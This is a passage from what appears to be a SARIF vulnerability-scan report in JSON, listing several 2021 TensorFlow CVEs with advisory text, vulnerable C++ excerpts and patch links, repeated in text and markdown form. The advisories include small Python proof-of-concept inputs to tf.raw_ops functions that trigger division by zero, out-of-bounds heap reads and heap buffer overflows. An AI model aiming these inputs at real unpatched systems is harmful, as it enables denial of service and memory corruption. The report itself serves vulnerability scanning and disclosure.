Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29528",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29528"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29528",
              "help": {
                "text": "Vulnerability CVE-2021-29528\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29528](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29528)\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.QuantizedMul`:\n\n```python\nimport tensorflow as tf\n\nx = tf.zeros([4, 1], dtype=tf.quint8)\ny = tf.constant([], dtype=tf.quint8)\nmin_x = tf.constant(0.0)\nmax_x = tf.constant(0.0010000000474974513)\nmin_y = tf.constant(0.0)\nmax_y = tf.constant(0.0010000000474974513)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```                            \n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55900e961ed4a23b438392024912154a2c2f5e85/tensorflow/core/kernels/quantized_mul_op.cc#L188-L198) does a division by a quantity that is controlled by the caller:\n\n```cc\ntemplate \u003cclass T, class Toutput\u003e\nvoid VectorTensorMultiply(const T* vector_data, int32 vector_offset,\n                          int64 vector_num_elements, const T* tensor_data,\n                          int32 tensor_offset, int64 tensor_num_elements,\n                          Toutput* output) {\n  for (int i = 0; i \u003c tensor_num_elements; ++i) {\n    const int64 vector_i = i % vector_num_elements;\n    ...\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6](https://github.com/tensorflow/tensorflow/commit/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29528**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29528](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29528)|\n\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.QuantizedMul`:\n\n```python\nimport tensorflow as tf\n\nx = tf.zeros([4, 1], dtype=tf.quint8)\ny = tf.constant([], dtype=tf.quint8)\nmin_x = tf.constant(0.0)\nmax_x = tf.constant(0.0010000000474974513)\nmin_y = tf.constant(0.0)\nmax_y = tf.constant(0.0010000000474974513)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```                            \n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55900e961ed4a23b438392024912154a2c2f5e85/tensorflow/core/kernels/quantized_mul_op.cc#L188-L198) does a division by a quantity that is controlled by the caller:\n\n```cc\ntemplate \u003cclass T, class Toutput\u003e\nvoid VectorTensorMultiply(const T* vector_data, int32 vector_offset,\n                          int64 vector_num_elements, const T* tensor_data,\n                          int32 tensor_offset, int64 tensor_num_elements,\n                          Toutput* output) {\n  for (int i = 0; i \u003c tensor_num_elements; ++i) {\n    const int64 vector_i = i % vector_num_elements;\n    ...\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6](https://github.com/tensorflow/tensorflow/commit/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29582",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29582"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29582",
              "help": {
                "text": "Vulnerability CVE-2021-29582\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29582)\n### Impact\nDue to lack of validation in `tf.raw_ops.Dequantize`, an attacker can trigger a read from outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\ninput_tensor=tf.constant(\n  [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)\ninput_tensor=tf.cast(input_tensor, dtype=tf.quint8)\nmin_range = tf.constant([-10], shape=[1], dtype=tf.float32)\nmax_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)\n  \ntf.raw_ops.Dequantize( \n  input=input_tensor, min_range=min_range, max_range=max_range, mode=`SCALED`,\n  narrow_range=True, axis=0, dtype=tf.dtypes.float32)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/26003593aa94b1742f34dc22ce88a1e17776a67d/tensorflow/core/kernels/dequantize_op.cc#L106-L131) accesses the `min_range` and `max_range` tensors in parallel but fails to check that they have the same shape:\n\n```cc\nif (num_slices == 1) {\n  const float min_range = input_min_tensor.flat\u003cfloat\u003e()(0);\n  const float max_range = input_max_tensor.flat\u003cfloat\u003e()(0);\n  DequantizeTensor(ctx, input, min_range, max_range, \u0026float_output);\n} else {\n  ...\n  auto min_ranges = input_min_tensor.vec\u003cfloat\u003e();\n  auto max_ranges = input_max_tensor.vec\u003cfloat\u003e();\n  for (int i = 0; i \u003c num_slices; ++i) {\n    DequantizeSlice(ctx-\u003eeigen_device\u003cDevice\u003e(), ctx,\n                    input_tensor.template chip\u003c1\u003e(i), min_ranges(i),\n                    max_ranges(i), output_tensor.template chip\u003c1\u003e(i));\n    ...\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5899741d0421391ca878da47907b1452f06aaf1b](https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29582**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29582)|\n\n### Impact\nDue to lack of validation in `tf.raw_ops.Dequantize`, an attacker can trigger a read from outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\ninput_tensor=tf.constant(\n  [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)\ninput_tensor=tf.cast(input_tensor, dtype=tf.quint8)\nmin_range = tf.constant([-10], shape=[1], dtype=tf.float32)\nmax_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)\n  \ntf.raw_ops.Dequantize( \n  input=input_tensor, min_range=min_range, max_range=max_range, mode=`SCALED`,\n  narrow_range=True, axis=0, dtype=tf.dtypes.float32)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/26003593aa94b1742f34dc22ce88a1e17776a67d/tensorflow/core/kernels/dequantize_op.cc#L106-L131) accesses the `min_range` and `max_range` tensors in parallel but fails to check that they have the same shape:\n\n```cc\nif (num_slices == 1) {\n  const float min_range = input_min_tensor.flat\u003cfloat\u003e()(0);\n  const float max_range = input_max_tensor.flat\u003cfloat\u003e()(0);\n  DequantizeTensor(ctx, input, min_range, max_range, \u0026float_output);\n} else {\n  ...\n  auto min_ranges = input_min_tensor.vec\u003cfloat\u003e();\n  auto max_ranges = input_max_tensor.vec\u003cfloat\u003e();\n  for (int i = 0; i \u003c num_slices; ++i) {\n    DequantizeSlice(ctx-\u003eeigen_device\u003cDevice\u003e(), ctx,\n                    input_tensor.template chip\u003c1\u003e(i), min_ranges(i),\n                    max_ranges(i), output_tensor.template chip\u003c1\u003e(i));\n    ...\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5899741d0421391ca878da47907b1452f06aaf1b](https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29558",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29558"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29558",
              "help": {
                "text": "Vulnerability CVE-2021-29558\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29558)\n### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.SparseSplit`:\n\n```python\nimport tensorflow as tf\n\nshape_dims = tf.constant(0, dtype=tf.int64)\nindices = tf.ones([1, 1], dtype=tf.int64)\nvalues = tf.ones([1], dtype=tf.int64)\nshape = tf.ones([1], dtype=tf.int64)\n\ntf.raw_ops.SparseSplit(\n    split_dim=shape_dims, indices=indices, values=values,\n    shape=shape, num_split=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/699bff5d961f0abfde8fa3f876e6d241681fbef8/tensorflow/core/util/sparse/sparse_tensor.h#L528-L530) accesses an array element based on a user controlled offset:\n\n```cc\nconst int dim = input_tensor.indices().matrix\u003cint64\u003e()(i, split_dim);\nint slice_index = GetSliceIndex(dim, split_size, residual);\nnum_values[slice_index]++;\n```\n\nThis results in overriding values on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31](https://github.com/tensorflow/tensorflow/commit/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29558**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29558)|\n\n### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.SparseSplit`:\n\n```python\nimport tensorflow as tf\n\nshape_dims = tf.constant(0, dtype=tf.int64)\nindices = tf.ones([1, 1], dtype=tf.int64)\nvalues = tf.ones([1], dtype=tf.int64)\nshape = tf.ones([1], dtype=tf.int64)\n\ntf.raw_ops.SparseSplit(\n    split_dim=shape_dims, indices=indices, values=values,\n    shape=shape, num_split=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/699bff5d961f0abfde8fa3f876e6d241681fbef8/tensorflow/core/util/sparse/sparse_tensor.h#L528-L530) accesses an array element based on a user controlled offset:\n\n```cc\nconst int dim = input_tensor.indices().matrix\u003cint64\u003e()(i, split_dim);\nint slice_index = GetSliceIndex(dim, split_size, residual);\nnum_values[slice_index]++;\n```\n\nThis results in overriding values on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31](https://github.com/tensorflow/tensorflow/commit/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29522",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29522"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29522",
              "help": {
                "text": "Vulnerability CVE-2021-29522\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29522](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29522)\n### Impact\nThe `tf.raw_ops.Conv3DBackprop*` operations fail to validate that the input tensors are not empty. In turn, this would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n                            \ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding=`SAME`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nfilter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding=`SAME`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a91bb59769f19146d5a0c20060244378e878f140/tensorflow/core/kernels/conv_grad_ops_3d.cc#L430-L450) does not check that the divisor used in computing the shard size is not zero:\n\n```cc\n  const int64 size_A = output_image_size * dims.out_depth;\n  const int64 size_B = filter_total_size * dims.out_depth;\n  const int64 size_C = output_image_size * filter_total_size;\n  const int64 work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction\n        ? 1\n        : (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\nThus, if attacker controls the input sizes, they can trigger a denial of service via a division by zero error.\n\n### Patches\nWe have patched the issue in GitHub commit [311403edbc9816df80274bd1ea8b3c0c0f22c3fa](https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29522**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29522](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29522)|\n\n### Impact\nThe `tf.raw_ops.Conv3DBackprop*` operations fail to validate that the input tensors are not empty. In turn, this would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n                            \ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding=`SAME`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nfilter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding=`SAME`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a91bb59769f19146d5a0c20060244378e878f140/tensorflow/core/kernels/conv_grad_ops_3d.cc#L430-L450) does not check that the divisor used in computing the shard size is not zero:\n\n```cc\n  const int64 size_A = output_image_size * dims.out_depth;\n  const int64 size_B = filter_total_size * dims.out_depth;\n  const int64 size_C = output_image_size * filter_total_size;\n  const int64 work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction\n        ? 1\n        : (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\nThus, if attacker controls the input sizes, they can trigger a denial of service via a division by zero error.\n\n### Patches\nWe have patched the issue in GitHub commit [311403edbc9816df80274bd1ea8b3c0c0f22c3fa](https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29546",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29546"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29546",
              "help": {
                "text": "Vulnerability CVE-2021-29546\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29546](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29546)\n### Impact\nAn attacker can trigger an integer division by zero undefined behavior in `tf.raw_ops.QuantizedBiasAdd`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nbias = tf.constant([], shape=[0], dtype=tf.quint8)\nmin_input = tf.constant(-10.0, dtype=tf.float32)\nmax_input = tf.constant(-10.0, dtype=tf.float32)\nmin_bias = tf.constant(-10.0, dtype=tf.float32)\nmax_bias = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,\n                            max_input=max_input, min_bias=min_bias,\n                            max_bias=max_bias, out_type=tf.qint32)\n```\n\nThis is because the [implementation of the Eigen kernel](https://github.com/tensorflow/tensorflow/blob/61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd/tensorflow/core/kernels/quantization_utils.h#L812-L849) does a division by the number of elements of the smaller input (based on shape) without checking that this is not zero:\n\n```cc\ntemplate \u003ctypename T1, typename T2, typename T3\u003e\nvoid QuantizedAddUsingEigen(const Eigen::ThreadPoolDevice\u0026 device,\n                            const Tensor\u0026 input, float input_min,\n                            float input_max, const Tensor\u0026 smaller_input,\n                            float smaller_input_min, float smaller_input_max,\n                            Tensor* output, float* output_min,\n                            float* output_max) {\n  ...\n  const int64 input_element_count = input.NumElements();\n  const int64 smaller_input_element_count = smaller_input.NumElements();\n  ...\n  bcast[0] = input_element_count / smaller_input_element_count;\n  ...\n}\n```\n\nThis integral division by 0 is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [67784700869470d65d5f2ef20aeb5e97c31673cb](https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29546**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29546](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29546)|\n\n### Impact\nAn attacker can trigger an integer division by zero undefined behavior in `tf.raw_ops.QuantizedBiasAdd`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nbias = tf.constant([], shape=[0], dtype=tf.quint8)\nmin_input = tf.constant(-10.0, dtype=tf.float32)\nmax_input = tf.constant(-10.0, dtype=tf.float32)\nmin_bias = tf.constant(-10.0, dtype=tf.float32)\nmax_bias = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBiasAdd(input=input_tensor, bias=bias, min_input=min_input,\n                            max_input=max_input, min_bias=min_bias,\n                            max_bias=max_bias, out_type=tf.qint32)\n```\n\nThis is because the [implementation of the Eigen kernel](https://github.com/tensorflow/tensorflow/blob/61bca8bd5ba8a68b2d97435ddfafcdf2b85672cd/tensorflow/core/kernels/quantization_utils.h#L812-L849) does a division by the number of elements of the smaller input (based on shape) without checking that this is not zero:\n\n```cc\ntemplate \u003ctypename T1, typename T2, typename T3\u003e\nvoid QuantizedAddUsingEigen(const Eigen::ThreadPoolDevice\u0026 device,\n                            const Tensor\u0026 input, float input_min,\n                            float input_max, const Tensor\u0026 smaller_input,\n                            float smaller_input_min, float smaller_input_max,\n                            Tensor* output, float* output_min,\n                            float* output_max) {\n  ...\n  const int64 input_element_count = input.NumElements();\n  const int64 smaller_input_element_count = smaller_input.NumElements();\n  ...\n  bcast[0] = input_element_count / smaller_input_element_count;\n  ...\n}\n```\n\nThis integral division by 0 is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [67784700869470d65d5f2ef20aeb5e97c31673cb](https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29520",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29520"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29520",
              "help": {
                "text": "Vulnerability CVE-2021-29520\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29520](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29520)\n### Impact\nMissing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)\nout_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding=`SAME`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_values = [-10.0] * (7 * 7 * 7 * 7 * 7)\ninput_values[0] = 429.6491056791816\ninput_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)\nfilter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)\n  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.\n\n### Patches\nWe have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our securityguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29520**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29520](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29520)|\n\n### Impact\nMissing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,\n                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)\nout_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding=`SAME`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_values = [-10.0] * (7 * 7 * 7 * 7 * 